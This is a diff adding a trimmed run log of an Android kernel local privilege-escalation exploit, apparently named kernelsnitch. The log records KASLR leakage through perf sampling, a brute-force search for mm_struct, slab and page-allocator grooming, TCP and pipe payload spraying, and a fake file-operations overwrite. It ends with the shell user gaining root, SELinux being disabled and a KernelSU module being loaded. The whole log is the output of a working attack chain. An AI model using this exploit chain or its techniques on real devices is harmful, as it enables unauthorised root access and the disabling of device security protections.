@@ -1,0 +1,442 @@
+# postlock_chain.log trimmed for repo: full=/tmp/opencode/accept_watch/v36_phasec/round1/postlock_chain.log
+# full_size=1848240 bytes, 13764 lines
+# full_sha1=b5117170198030c8d194ce6a170e0a589891d022
+# ---- head (first 120) ----
+[b59eeb053 06:41:49] [32m[+][t13382] [0mpreload starting pid=13382
+[b59eeb053 06:41:49] [32m[+][t13382] [0mlayout static measured=0 pvo=0000000000000000 la0=ffffff8000000000 p0=ffffff8000000000 vmemmap=[fffffffeffe00000-ffffffff3fe00000] window=[ffffff8000000000-ffffffe000000000] kaslr=pending0000000000000000
+[b59eeb053 06:41:49] [31m[-][t13382] [0mlayout measurement failed; static target fallback in effect (override via KS_LAYOUT_PVO / KS_LAYOUT_VM / KSNITCH_IDENTITY_START / KSNITCH_IDENTITY_END)
+[b59eeb053 06:41:49] [32m[+][t13382] [0mstartup context pid=13382 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[b59eeb053 06:41:49] [32m[+][t13382] [0mstartup limits pid=13382 NoNewPrivs=0 Seccomp=0 Seccomp_filters=?
+[b59eeb053 06:41:49] [32m[+][t13382] [0mbuild config pid=13382 label=pfum10c48_no_btf slide=pselect main=pselect
+[b59eeb053 06:41:49] [32m[+][t13382] [0mp0 profile pid=13382 phys_offset=0000000080000000 kernel_phys_load=00000000a0080000 delta=0000000020080000 slide_logger=ffffff8022b2acf0 bootid_data=ffffff8022a64ab8 init_task=ffffff8022bef580 root_tg=ffffff8022ea9e70 sysctl_bootid=ffffff80231b13e9
+[b59eeb053 06:41:49] [33m[*][t13382] [0mperf round=0 samples=2031 round_min=ffffffdfba281cbc slot=ffffffdfba200000 hits=1 min=ffffffdfba281cbc
+[b59eeb053 06:41:49] [33m[*][t13382] [0mperf round=1 samples=2039 round_min=ffffffdfba281cbc slot=ffffffdfba200000 hits=2 min=ffffffdfba281cbc
+[b59eeb053 06:41:49] [32m[+][t13382] [0mperf text-base pid=13382 samples=4070 min_kip=ffffffdfba281cbc slot_off=0000000000081cbc text_base=ffffffdfba280000
+[b59eeb053 06:41:49] [32m[+][t13382] [0mtext-base-ok pid=13382 text=ffffffdfba280000 slide=0000001faa200000 (perf)
+[b59eeb053 06:41:49] [33m[*][t13382] [0mprepare_kernel_page payload=0 mm_struct_sz=0x3c0 mm_objs_per_slab=34 order3_size=0x8000
+[b59eeb053 06:41:51] [33m[*][t13382] [0mkernelsnitch runtime mm_struct_sz=0x3c0 mm_order=3 threads=8 collisions=6 verbose=1 mte=0
+[b59eeb053 06:41:51] [33m[*][t13382] [0mparameters cpu (16) mm_struct sz (3c0) mm slab order (3) thread cnt (8) collisions (6) futex_hashsize (2048) possible (8) expected_K (2048) identity [ffffff8000000000-ffffffe000000000] mte disabled
+[b59eeb053 06:41:51] [33m[*][t14717] [0mapprox_time=6 thr=60
+[b59eeb053 06:41:52] [33m[*][t14717] [0mstart finding collisisons
+[b59eeb053 06:41:52] [33m[*][t14717] [0mtarget    00000079c2d480c8
+[b59eeb053 06:41:52] [33m[*][t14717] [0mtarget_time=2489 thr=60
+[b59eeb053 06:41:54] [33m[*][t14717] [0m  0000006942b29668 i=4813 t=17829/17835/17793
+[b59eeb053 06:41:55] [33m[*][t14717] [0m  0000006942b919a8 i=4917 t=17888/17834/17813
+[b59eeb053 06:41:56] [33m[*][t14717] [0m  00000069435beb10 i=7522 t=17836/17842/17874
+[b59eeb053 06:41:57] [33m[*][t14717] [0m  0000006943a62030 i=8710 t=17832/17848/17861
+[b59eeb053 06:41:59] [33m[*][t14717] [0m  00000069444d03a0 i=11380 t=17789/17854/17835
+[b59eeb053 06:41:59] [33m[*][t14717] [0mfound 5 collisisons
+[b59eeb053 06:41:59] [33m[*][t14717] [0mpost-pile baseline=20 target=20 count=5
+[b59eeb053 06:41:59] [33m[*][t14717] [0mpost-pile[1] 0000006942b29668 t=20
+[b59eeb053 06:41:59] [33m[*][t14717] [0mpost-pile[2] 0000006942b919a8 t=20
+[b59eeb053 06:41:59] [33m[*][t14717] [0mpost-pile[3] 00000069435beb10 t=21
+[b59eeb053 06:41:59] [33m[*][t14717] [0mpost-pile[4] 0000006943a62030 t=21
+[b59eeb053 06:41:59] [33m[*][t14717] [0mpost-pile[5] 00000069444d03a0 t=21
+[b59eeb053 06:42:00] [33m[*][t13382] [0mstart bruteforcing
+[b59eeb053 06:42:00] [33m[*][t18867] [0m[  2] start finding mm_struct [ffffff9800000000-ffffffa400000000]
+[b59eeb053 06:42:00] [33m[*][t18865] [0m[  0] start finding mm_struct [ffffff8000000000-ffffff8c00000000]
+[b59eeb053 06:42:00] [33m[*][t18869] [0m[  4] start finding mm_struct [ffffffb000000000-ffffffbc00000000]
+[b59eeb053 06:42:00] [33m[*][t18868] [0m[  3] start finding mm_struct [ffffffa400000000-ffffffb000000000]
+[b59eeb053 06:42:00] [33m[*][t18866] [0m[  1] start finding mm_struct [ffffff8c00000000-ffffff9800000000]
+[b59eeb053 06:42:00] [33m[*][t18870] [0m[  5] start finding mm_struct [ffffffbc00000000-ffffffc800000000]
+[b59eeb053 06:42:00] [33m[*][t18872] [0m[  7] start finding mm_struct [ffffffd400000000-ffffffe000000000]
+[b59eeb053 06:42:00] [33m[*][t18871] [0m[  6] start finding mm_struct [ffffffc800000000-ffffffd400000000]
+[b59eeb053 06:42:05] [33m[*][t18866] [0mfound mm_struct ffffff9385ecb480
+[b59eeb053 06:42:05] [33m[*][t18870] [0m[  5] scan done coarse=ffffffc3c0000000 end=ffffffc800000000 found=1
+[b59eeb053 06:42:05] [33m[*][t18872] [0m[  7] scan done coarse=ffffffdbc0000000 end=ffffffe000000000 found=1
+[b59eeb053 06:42:05] [33m[*][t18867] [0m[  2] scan done coarse=ffffff9f40000000 end=ffffffa400000000 found=1
+[b59eeb053 06:42:05] [33m[*][t18869] [0m[  4] scan done coarse=ffffffb780000000 end=ffffffbc00000000 found=1
+[b59eeb053 06:42:05] [33m[*][t18868] [0m[  3] scan done coarse=ffffffabc0000000 end=ffffffb000000000 found=1
+[b59eeb053 06:42:05] [33m[*][t18865] [0m[  0] scan done coarse=ffffff87c0000000 end=ffffff8c00000000 found=1
+[b59eeb053 06:42:05] [33m[*][t18866] [0m[  1] scan done coarse=ffffff93c0000000 end=ffffff9800000000 found=1
+[b59eeb053 06:42:05] [33m[*][t18871] [0m[  6] scan done coarse=ffffffcfc0000000 end=ffffffd400000000 found=1
+[b59eeb053 06:42:05] [33m[*][t13382] [0mlayout infer-from-leak base=ffffff9385ec8000 la0=ffffff9300000000 p0=ffffff9380000000 vmemmap=[fffffffeffe00000-ffffffff3fe00000]
+[b59eeb053 06:42:05] [33m[*][t13382] [0mprepare_kernel_page base=0xffffff9385ec8000 phys_probe=0xffffff93a2bd1d38 delta=-483433784 (-0.5GB)
+[b59eeb053 06:42:05] [33m[*][t13382] [0mprepare_skb_payload base=ffffff9385ec8000 delta=0 payload_base=ffffff9385ec8000
+[b59eeb053 06:42:05] [33m[*][t13382] [0mskbdelta wrote pb=ffffff9385ec8000 path=/data/local/tmp/ksu_boot/skbdelta
+[b59eeb053 06:42:05] [33m[*][t13382] [0mpayload nonce 5537d4630a9c7e7 at 280 1100 9100 9280 d280 f280
+[b59eeb053 06:42:05] [33m[*][t13382] [0mdone
+[b59eeb053 06:42:05] [31m[-][t13382] [0mslub shrink(post-prepare) failed errno=13
+[b59eeb053 06:42:05] [33m[*][t13382] [0mreclaim deterministic send_size=0x8000 (one order-3 frag)
+[b59eeb053 06:42:05] [33m[*][t13382] [0mslabinfo pre-teardown: slabs=53 objs=1802 free=0
+[b59eeb053 06:42:05] [33m[*][t13382] [0mslabinfo before victim-close: slabs=53 objs=1802 free=0
+[b59eeb053 06:42:05] [33m[*][t13382] [0mfix40 mm_page_free tracepoint id=240
+[b59eeb053 06:42:05] [33m[*][t13382] [0mfix40 free-arm n=14 est_pfn=548552 k=[0,13]
+[b59eeb053 06:42:05] [33m[*][t13382] [0morder3 drain conn=0 sent=1024 held=1024 buddy -1->-1
+[b59eeb053 06:42:05] [33m[*][t13382] [0morder3 drain conn=1 sent=1024 held=2048 buddy -1->-1
+[b59eeb053 06:42:05] [33m[*][t13382] [0morder3 drain conn=2 sent=1024 held=3072 buddy -1->-1
+[b59eeb053 06:42:05] [33m[*][t13382] [0morder3 drain conn=3 sent=1024 held=4096 buddy -1->-1
+[b59eeb053 06:42:05] [33m[*][t13382] [0morder3 drain conn=4 sent=1024 held=5120 buddy -1->-1
+[b59eeb053 06:42:05] [33m[*][t13382] [0morder3 drain conn=5 sent=1024 held=6144 buddy -1->-1
+[b59eeb053 06:42:05] [33m[*][t13382] [0morder3 drain conn=6 sent=1024 held=7168 buddy -1->-1
+[b59eeb053 06:42:06] [33m[*][t13382] [0morder3 drain conn=7 sent=1024 held=8192 buddy -1->-1
+[b59eeb053 06:42:06] [33m[*][t13382] [0morder3 drain done conns=8 pages=8192 buddy -1->-1 target=16
+[b59eeb053 06:42:06] [33m[*][t13382] [0mslabinfo post-victim-rcu: slabs=53 objs=1802 free=0
+[b59eeb053 06:42:06] [31m[-][t13382] [0mslub shrink(post-pins) failed errno=13
+[b59eeb053 06:42:06] [33m[*][t13382] [0mrcu socket cycles=1024
+[b59eeb053 06:42:06] [33m[*][t13382] [0mslabinfo post-socket-rcu: slabs=53 objs=1802 free=0
+[b59eeb053 06:42:06] [33m[*][t13382] [0mfix36 mm_page_alloc tracepoint id=242
+[b59eeb053 06:42:06] [33m[*][t13382] [0mfix36 tp arm n=14 ctrl=1 est_pfn=548552 k=[0,13] k_fixed=-1
+[b59eeb053 06:42:06] [33m[*][t13382] [0mreclaim sends ok=501/1024 last_err=11
+[b59eeb053 06:42:06] [33m[*][t13382] [0mfix36 phase1 tp ctrl=524 ord3=501 best=0 best_pfn=0 best3=0 best3_pfn=0 n=14
+[b59eeb053 06:42:06] [33m[*][t13382] [0mphase2 forensics: post killed n=34
+[b59eeb053 06:42:07] [33m[*][t13382] [0mphase2 forensics: spray killed n=204
+[b59eeb053 06:42:07] [33m[*][t13382] [0mphase2 forensics: prepare storm i=0/1088
+[b59eeb053 06:42:07] [33m[*][t13382] [0mphase2 forensics: prepare storm i=256/1088
+[b59eeb053 06:42:07] [33m[*][t13382] [0mphase2 forensics: prepare storm i=512/1088
+[b59eeb053 06:42:07] [33m[*][t13382] [0mphase2 forensics: prepare storm i=768/1088
+[b59eeb053 06:42:07] [33m[*][t13382] [0mphase2 forensics: prepare storm i=1024/1088
+[b59eeb053 06:42:07] [33m[*][t13382] [0mphase2 forensics: prepare storm done n=1088
+[b59eeb053 06:42:08] [33m[*][t13382] [0mphase2 forensics: pre dropped n=33
+[b59eeb053 06:42:08] [33m[*][t13382] [0mphase2 forensics: membarrier rv=0 errno=11
+[b59eeb053 06:42:08] [33m[*][t13382] [0mslabinfo after rcu-kill: slabs=30 objs=850 free=170
+[b59eeb053 06:42:08] [33m[*][t13382] [0mfix40 free HIT pfn=2907848 k=9 hits=1
+[b59eeb053 06:42:08] [33m[*][t13382] [0mfix40 free verdict nhit=1 k_true=9
+[b59eeb053 06:42:08] [33m[*][t13382] [0mbuddy pre fopen errno=13
+[b59eeb053 06:42:08] [31m[-][t13382] [0mwatchpoint nonce open addr=ffffff9385ec9100 errno=22
+[b59eeb053 06:42:08] [31m[-][t13382] [0mwatchpoint open open addr=ffffff9385ec9070 errno=22
+[b59eeb053 06:42:08] [31m[-][t13382] [0mwatchpoint sentinel open addr=ffffff9385ecff00 errno=22
+[b59eeb053 06:42:08] [33m[*][t13382] [0mphase2 tcp connections=8
+[b59eeb053 06:42:08] [33m[*][t18907] [0mfix36 tp arm n=14 ctrl=1 est_pfn=548552 k=[0,13] k_fixed=-1
+[b59eeb053 06:42:08] [33m[*][t18907] [0mphase2 conn[0] sends ok=112
+[b59eeb053 06:42:08] [33m[*][t18907] [0mphase2 conn[1] sends ok=112
+[b59eeb053 06:42:08] [33m[*][t18907] [0mphase2 conn[2] sends ok=112
+[b59eeb053 06:42:08] [33m[*][t18907] [0mphase2 conn[3] sends ok=112
+[b59eeb053 06:42:08] [33m[*][t18907] [0mphase2 conn[4] sends ok=112
+[b59eeb053 06:42:08] [33m[*][t18907] [0mphase2 conn[5] sends ok=106
+[b59eeb053 06:42:08] [33m[*][t18907] [0mphase2 conn[6] sends ok=1
+[b59eeb053 06:42:08] [33m[*][t18907] [0mphase2 stop after hit conn=5 send=104 (fix46)
+[b59eeb053 06:42:08] [33m[*][t13382] [0mfix38 capture conn=5 send=104 gsend=667 pfn=2907848 ord3_at=666 all_at_hit=1
+[b59eeb053 06:42:08] [33m[*][t13382] [0mfix51 capture-only (no rebase) nhit=1 k=9 pfn=2907848 est_pfn=548552 base=ffffff9385ec8000 payload_base=ffffff9385ec8000
+[b59eeb053 06:42:08] [33m[*][t13382] [0mfix39 phase hit_cum=340000 A=0 sK=8000 sK1=8000 have1=1 delta=0 deterministic=1
+[b59eeb053 06:42:08] [33m[*][t13382] [0mfix39 deterministic delta=0 OK
+[b59eeb053 06:42:08] [33m[*][t13382] [0mphase2 total sends ok=667 last_err=0 shorts=0
+[b59eeb053 06:42:08] [33m[*][t13382] [0mpayload wp hits nonce=-1 open=-1 sentinel=-1
+[b59eeb053 06:42:08] [33m[*][t13382] [0mfix36 phase2 tp ctrl=676 ord3=668 best=1 best_pfn=2907848 best3=1 best3_pfn=2907848 n=14
+[b59eeb053 06:42:08] [33m[*][t13382] [0mfix36 phase2 tp HIT pfn=2907848 hits=1 ord3=1 k=9
+[b59eeb053 06:42:08] [33m[*][t13382] [0mphase2 peek conn=5 n=4352 w0=0 w1=ffffff9385eca238 w2=ffffffdfba7e99cc w3=ffffffdfba7e9f04
+[b59eeb053 06:42:08] [33m[*][t13382] [0mphase2 peek open@1070 at68=0000000000000000 at6f=ffffdfba3e2f3800 at70=ffffffdfba3e2f38 want_open=ffffffdfba3e2f38
+[b59eeb053 06:42:08] [33m[*][t13382] [0mphase2 peek hex@1068[b59eeb053 06:42:08] [33m[*][t13382] [0m 00[b59eeb053 06:42:08] [33m[*][t13382] [0m 00[b59eeb053 06:42:08] [33m[*][t13382] [0m 00[b59eeb053 06:42:08] [33m[*][t13382] [0m 00[b59eeb053 06:42:08] [33m[*][t13382] [0m 00[b59eeb053 06:42:08] [33m[*][t13382] [0m 00[b59eeb053 06:42:08] [33m[*][t13382] [0m 00[b59eeb053 06:42:08] [33m[*][t13382] [0m 00[b59eeb053 06:42:08] [33m[*][t13382] [0m 38[b59eeb053 06:42:08] [33m[*][t13382] [0m 2f[b59eeb053 06:42:08] [33m[*][t13382] [0m 3e[b59eeb053 06:42:08] [33m[*][t13382] [0m ba[b59eeb053 06:42:08] [33m[*][t13382] [0m df[b59eeb053 06:42:08] [33m[*][t13382] [0m ff[b59eeb053 06:42:08] [33m[*][t13382] [0m ff[b59eeb053 06:42:08] [33m[*][t13382] [0m ff[b59eeb053 06:42:08] [33m[*][t13382] [0m 00[b59eeb053 06:42:08] [33m[*][t13382] [0m 00[b59eeb053 06:42:08] [33m[*][t13382] [0m 00[b59eeb053 06:42:08] [33m[*][t13382] [0m 00[b59eeb053 06:42:08] [33m[*][t13382] [0m 00[b59eeb053 06:42:08] [33m[*][t13382] [0m 00[b59eeb053 06:42:08] [33m[*][t13382] [0m 00[b59eeb053 06:42:08] [33m[*][t13382] [0m 00[b59eeb053 06:42:08] [33m[*][t13382] [0m
+[b59eeb053 06:42:09] [33m[*][t13382] [0mpayload pin splice conn=5 bytes=3473408 pipes=54 rounds=4
+[b59eeb053 06:42:09] [33m[*][t13382] [0mpayload pin extra conns bytes=2752512 pipes=42
+[b59eeb053 06:42:09] [33m[*][t13382] [0mhold dump pin tee=4352 read=4352 slot1050=ffffffdfba3e2434 want=ffffffdfba3e2434 ALIVE
+[b59eeb053 06:42:09] [33m[*][t13382] [0mslabinfo after sends: slabs=30 objs=850 free=170
+[b59eeb053 06:42:09] [33m[*][t13382] [0mreclaim queue right after sends rxq=917504 txq=0
+# ---- key lines ----
+[b59eeb053 06:42:09] [33m[*][t13382] [0mpayload pin splice conn=5 bytes=3473408 pipes=54 rounds=4
+[b59eeb053 06:42:09] [33m[*][t13382] [0mpayload pin extra conns bytes=2752512 pipes=42
+[b59eeb053 06:42:39] [33m[*][t26257] [0mroot child forked pid=26257 uid=2000
+[b59eeb053 06:43:06] [33m[*][t26257] [0mroot child proceeding uid=0 euid=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mpipe-physrw-summary pid=13382 done=1 root=1 kaslr=1
+[b59eeb053 06:43:06] [33m[*][t26257] [0mroot child insmod helper forked pid=26547 fm=/data/local/tmp/ksu_boot/finitmod ko=/data/local/tmp/ksu_boot/kernelsu.ko
+[b59eeb053 06:43:06] [33m[*][t26257] [0mroot child coldstart forked pid=26548 script=/data/local/tmp/ksu_boot/restore.sh
+[b59eeb053 06:43:06] [33m[*][t26257] [0mpipe-physrw-summary pid=26257 done=1 root=1 kaslr=1
+[b59eeb053 06:43:06] [33m[*][t18909] [0mroot child result done=1 uid_after=0 setgid=0/0 setuid=0/0 setenforce=0/0 selinux=1->0 installer=0 pid=0 err=0 started=0 done=0 ok=0 uid=0 euid=0 cap=ffffffdfbc77b388/ffffffdfbc77b388
+[b59eeb053 06:43:07] [33m[*][t18909] [0mpselect route done calls=1 success=1 step=0 errno=0
+[b59eeb053 06:43:07] [32m[+][t13382] [0mpipe-physrw-summary pid=13382 done=1 root=1 kaslr=1 base=ffffffdfba280000 slide=0000001faa200000
+[b59eeb053 06:43:07] [33m[*][t13382] [0mks_neutralize fake fops close slots owner=8 tail=24 table=ffffff9385ec9001 ok=1 verified=1
+[b59eeb053 06:43:07] [33m[*][t13382] [0mexit tail: closed fake-fops probe fd=217 (after pipe clear, before child kill)
+[b59eeb053 06:43:07] [33m[*][t13382] [0mexit tail: killing pipe_prepare_child=19081
+[b59eeb053 06:43:07] [33m[*][t13382] [0mexit tail: pipe_prepare_child reaped
+[b59eeb053 06:43:07] [33m[*][t13382] [0mexit tail: constructor returning
+# ---- tail (last 300) ----
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mself task via child slot+0x660 = ffffff9392cfa180 (real_parent, comm ok)
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs read fd=216 target=ffffff93ef539000 len=40 fill=0 pos=7883678008957363516 page=92978c32bfdd2ac4 hi=65 set=0 rd=40 errno=0 try=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
+[b59eeb053 06:43:06] [33m[*][t18909] [0mcfgfs write fd=216 target=ffffff93ef539000 len=40 set=0 wr=40 errno=0
